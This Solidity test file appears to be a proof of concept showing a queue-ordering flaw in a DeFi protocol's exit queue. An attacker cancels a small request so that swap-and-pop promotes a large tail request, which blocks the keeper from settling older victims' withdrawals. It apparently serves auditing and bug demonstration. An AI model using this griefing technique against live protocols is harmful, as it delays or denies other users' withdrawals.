// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Registry} from "registry/Registry.sol";
import {Controller} from "../../../../src/contracts/Controller.sol";
import {EVE} from "../../../../src/contracts/EVE.sol";
import {AMM} from "../../../../src/contracts/AMM.sol";
import {Oracle} from "../../../../src/contracts/Oracle.sol";
import {ExitQueue} from "../../../../src/contracts/ExitQueue.sol";
import {QueueKeeperExecutor} from "../../../../src/contracts/automation/QueueKeeperExecutor.sol";
import {Auth} from "../../../../src/libraries/Auth.sol";
import {IQueueKeeperExecutor} from "../../../../src/interfaces/automation/IQueueKeeperExecutor.sol";

import {ProtocolTestBase} from "../../../helpers/ProtocolTestBase.sol";
import {MockPriceFeed} from "../../../mocks/MockPriceFeed.sol";

contract QueueOrderingTest is ProtocolTestBase {
    uint256 internal constant BOOTSTRAP_DEPOSIT = 10 ether;
    uint256 internal constant SMALL_EXIT = 1 ether;
    uint256 internal constant LARGE_EXIT = 5 ether;

    Registry internal registry;
    Controller internal controller;
    EVE internal eve;
    AMM internal amm;
    Oracle internal oracle;
    ExitQueue internal exitQueue;
    QueueKeeperExecutor internal executor;

    address internal holder;
    address internal forwarder;
    address internal attackerFront;
    address internal victim1;
    address internal victim2;
    address internal attackerTail;

    function setUp() public {
        holder = makeAddr("holder");
        forwarder = makeAddr("forwarder");
        attackerFront = makeAddr("attackerFront");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        attackerTail = makeAddr("attackerTail");

        ProtocolContracts memory deployed = _deployProtocol(address(this), DEFAULT_CONNECTOR_WEIGHT);
        registry = deployed.registry;
        controller = deployed.controller;
        eve = deployed.token;
        amm = deployed.amm;
        oracle = deployed.oracle;
        exitQueue = deployed.exitQueue;

        oracle.updateUsdFeedInfo(address(0), address(new MockPriceFeed(8, 4_000e8)), 1 hours);

        executor = new QueueKeeperExecutor(address(registry));
        registry.grantRole(Auth.KEEPER_ROLE, address(executor));
        executor.setForwarder(forwarder);

        vm.deal(holder, BOOTSTRAP_DEPOSIT);
        vm.prank(holder);
        amm.enter{value: BOOTSTRAP_DEPOSIT}(1);

        vm.startPrank(holder);
        eve.transfer(attackerFront, 1_000e18);
        eve.transfer(victim1, 5_000e18);
        eve.transfer(victim2, 5_000e18);
        eve.transfer(attackerTail, 25_000e18);
        vm.stopPrank();
    }

    function test_AttackerCancellationPromotesLargeTailAndBlocksAffordableOlderRequest() public {
        uint256 batchId = _queue(attackerFront, 0.1 ether);
        assertEq(_queue(victim1, SMALL_EXIT), batchId);
        assertEq(_queue(victim2, SMALL_EXIT), batchId);
        assertEq(_queue(attackerTail, LARGE_EXIT), batchId);

        address[] memory beforeCancel = exitQueue.unprocessedUsers(batchId);
        assertEq(beforeCancel[0], attackerFront);
        assertEq(beforeCancel[1], victim1);
        assertEq(beforeCancel[2], victim2);
        assertEq(beforeCancel[3], attackerTail);

        vm.prank(attackerFront);
        amm.cancelRedemption(batchId);

        address[] memory afterCancel = exitQueue.unprocessedUsers(batchId);
        assertEq(afterCancel[0], attackerTail, "swap-and-pop promotes attacker tail to head");
        assertEq(afterCancel[1], victim1);
        assertEq(afterCancel[2], victim2);

        _price(batchId);
        uint256 victimCost = _requestCost(batchId, victim1);
        uint256 attackerCost = _requestCost(batchId, attackerTail);
        assertGt(attackerCost, victimCost);
        vm.deal(address(controller), victimCost);

        assertEq(executor.affordableRequests(batchId), 0, "promoted large head blocks keeper prefix");
        (bool upkeepNeeded,) = executor.checkUpkeep("");
        assertFalse(upkeepNeeded, "keeper sees no processable work despite exact victim liquidity");

        controller.processRequest(batchId, victim1);
        (bool processed,,,,) = exitQueue.requestInfo(batchId, victim1);
        assertTrue(processed, "same balance directly settles older victim");
        assertEq(amm.claimableBalances(victim1), victimCost);
    }

    function test_ProcessingHeadPromotesLastRequesterAheadOfOlderUser() public {
        uint256 batchId = _queue(victim1, SMALL_EXIT);
        assertEq(_queue(victim2, SMALL_EXIT), batchId);
        assertEq(_queue(attackerTail, LARGE_EXIT), batchId);
        _price(batchId);

        executor.setMaxUsersPerUpkeep(1);
        vm.deal(address(controller), _requestCost(batchId, victim1));
        assertEq(executor.affordableRequests(batchId), 1);
        _perform(IQueueKeeperExecutor.QueueAction.ProcessRequests, batchId);

        address[] memory remaining = exitQueue.unprocessedUsers(batchId);
        assertEq(remaining[0], attackerTail, "ordinary processing swaps last requester to index zero");
        assertEq(remaining[1], victim2, "older second requester is displaced");

        vm.deal(address(controller), _requestCost(batchId, victim2));
        assertEq(executor.affordableRequests(batchId), 0, "new large head blocks older affordable request");
    }

    function _queue(address user, uint256 requestedETH) internal returns (uint256 batchId) {
        vm.startPrank(user);
        eve.approve(address(amm), type(uint256).max);
        batchId = amm.exit(requestedETH, eve.balanceOf(user), 0);
        vm.stopPrank();
    }

    function _price(uint256 batchId) internal {
        vm.warp(block.timestamp + executor.minBatchAge());
        _perform(IQueueKeeperExecutor.QueueAction.PriceBatch, batchId);
    }

    function _perform(IQueueKeeperExecutor.QueueAction action, uint256 batchId) internal {
        vm.prank(forwarder);
        executor.performUpkeep(abi.encode(action, batchId));
    }

    function _requestCost(uint256 batchId, address user) internal view returns (uint256) {
        (, uint256 price,,,) = exitQueue.batchInfo(batchId);
        (,,, uint256 tokensToBurn,) = exitQueue.requestInfo(batchId, user);
        return tokensToBurn * price / 1e18;
    }
}
